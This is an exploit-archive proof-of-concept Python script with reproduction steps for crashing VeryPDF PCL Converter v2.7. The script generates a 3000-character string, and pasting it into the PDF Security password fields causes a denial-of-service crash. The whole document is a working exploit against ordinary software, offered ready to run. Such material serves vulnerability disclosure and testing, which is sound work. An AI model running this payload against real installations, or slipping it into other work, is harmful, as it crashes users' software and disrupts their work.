# -*- coding: utf-8 -*-
# Exploit Title: VeryPDF PCL Converter v2.7 - Denial of Service (PoC)
# Date: 19/05/2019
# Author: Alejandra Sánchez
# Vendor Homepage: http://www.verypdf.com
# Software: http://www.verypdf.com/pcltools/pcl-converter.exe
# Version: 2.7
# Tested on: Windows 10

# Proof of Concept:
# 1.- Run the python script "PCLConverter.py", it will create a new file "PCLConverter.txt"
# 2.- Copy the text from the generated PCLConverter.txt file to clipboard
# 3.- Open VeryPDF PCL Converter v2.7 
# 4.- Go to 'Setting' > 'PDF Security'
# 5.- Mark 'Encrypt PDF File' and paste clipboard in the field 'User Password' or the field 'Master Password' and Click 'OK'
# 6.- Click on 'Add File(s)', and select a pcl file, e.g. 'sample.pcl'
# 7.- Click on 'Start', you will see a crash

buffer = "\x41" * 3000
f = open ("PCLConverter.txt", "w")
f.write(buffer)
f.close()